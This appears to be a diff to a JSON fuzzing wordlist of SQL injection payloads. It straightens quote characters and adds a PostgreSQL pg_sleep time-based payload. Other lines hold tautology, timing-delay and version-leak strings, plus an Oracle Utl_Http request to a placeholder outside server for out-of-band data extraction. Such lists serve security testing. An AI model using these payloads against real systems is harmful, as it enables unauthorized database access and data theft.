@@ -1,8 +1,9 @@
 {
    "fuzz_list": [
-         "‘",
-         "‘--",
-         "‘ or 1=1--",
+         "x'||pg_sleep(10)--",
+         "'",
+         "'--",
+         "' or 1=1--",
          "' or 1 in (@@version)--",
          "'; waitfor delay '0:30:0'--",
          "'||Utl_Http.request('http://<yourservername>') from dual--",
